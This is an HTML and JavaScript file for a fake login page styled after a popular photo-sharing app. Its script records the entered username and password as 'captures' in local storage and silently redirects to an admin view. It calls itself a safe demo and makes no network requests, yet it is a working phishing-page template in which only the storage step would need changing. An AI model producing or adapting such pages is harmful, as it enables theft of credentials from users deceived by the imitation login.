<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>PhotoShare — Log in</title>
  <style>
    body{font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial; background:#fafafa; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0;}
    .box{width:360px; background:#fff; border:1px solid #ddd; padding:22px; border-radius:10px; text-align:center;}
    input{width:100%; padding:10px; margin:8px 0; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;}
    button{width:100%; padding:10px; background:#0095f6; color:#fff; border:none; border-radius:6px; font-weight:700; cursor:pointer;}
    .note{font-size:13px; color:#666; margin-top:10px;}
  </style>
</head>
<body>
  <div class="box">
    <h2>PhotoShare</h2>
    <form id="loginForm" autocomplete="off" novalidate>
      <input id="username" type="text" placeholder="Phone number, username or email" required />
      <input id="password" type="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
    <div class="note">For demo only — this page stores a <em>simulated</em> capture locally and redirects to an admin view.</div>
  </div>

  <script>
    // SAFE simulation: store entries only in localStorage of this origin, no network requests.
    function saveCapture(user, pass) {
      try {
        const key = 'photoshare_sim_captures_v1';
        const raw = localStorage.getItem(key);
        const arr = raw ? JSON.parse(raw) : [];
        const ts = new Date().toISOString();
        arr.push({username: user, password: pass, ts: ts});
        localStorage.setItem(key, JSON.stringify(arr));
      } catch (e) {
        console.error('localStorage error', e);
      }
    }

    document.getElementById('loginForm').addEventListener('submit', function(e){
      e.preventDefault();
      const u = document.getElementById('username').value || '';
      const p = document.getElementById('password').value || '';
      // store to localStorage (simulation only)
      saveCapture(u, p);
      // redirect silently to admin page (no alerts)
      window.location.href = 'admin.html';
    });
  </script>
</body>
</html>
